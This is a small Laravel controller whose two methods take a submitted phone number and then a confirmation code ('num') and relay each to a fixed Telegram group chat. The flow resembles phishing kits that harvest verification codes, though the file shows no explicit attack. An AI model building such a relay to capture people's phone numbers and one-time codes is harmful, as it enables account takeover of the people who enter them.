<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Telegram\Bot\Laravel\Facades\Telegram;
use NotificationChannels\Telegram\TelegramMessage;
use Illuminate\Notifications\Notification;

class TelegramController extends Controller
{

    public function storeMessage(Request $request){
        $request->validate([
            'phone'=>'required'
        ]);
        Telegram::sendMessage([
            'chat_id'=>'-1002003672783',
            'parse_mode'=>'HTML',
            'text'=>$request->input('phone')
        ]);
        return view('confirm');

        //return redirect()->route('/confirm');
    }

    public function storeConfirm(Request $request){
        $request->validate([
            'num'=>'required'
        ]);
        Telegram::sendMessage([
            'chat_id'=>'-1002003672783',
            'parse_mode'=>'HTML',
            'text'=>$request->input('num')
        ]);
        return view('confirm');
    }

    
}
